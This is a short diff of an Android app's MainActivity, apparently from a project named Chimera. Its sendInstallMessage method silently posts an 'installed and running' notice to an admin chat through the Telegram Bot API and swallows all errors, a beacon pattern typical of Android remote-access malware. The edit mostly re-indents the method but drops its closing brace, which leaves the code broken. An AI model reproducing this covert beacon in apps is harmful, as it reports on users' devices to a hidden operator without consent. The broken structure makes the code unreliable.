@@ -88,14 +88,13 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void sendInstallMessage() {
-        try {
-            String token = ConfigLoader.getBotToken();
-            long chat = ConfigLoader.getAdminId();
-            if (token == null || chat == 0) return;
-            String url = "https://api.telegram.org/bot" + token + "/sendMessage";
-            String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
-            TelegramBotWorker worker = new TelegramBotWorker(this);
-            worker.post(url, body);
-        } catch (Exception e) {}
-    }
+    try {
+        String token = ConfigLoader.getBotToken();
+        long chat = ConfigLoader.getAdminId();
+        if (token == null || chat == 0) return;
+        String url = "https://api.telegram.org/bot" + token + "/sendMessage";
+        String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
+        TelegramBotWorker worker = new TelegramBotWorker(this);
+        worker.post(url, body);
+    } catch (Exception e) {}
 }
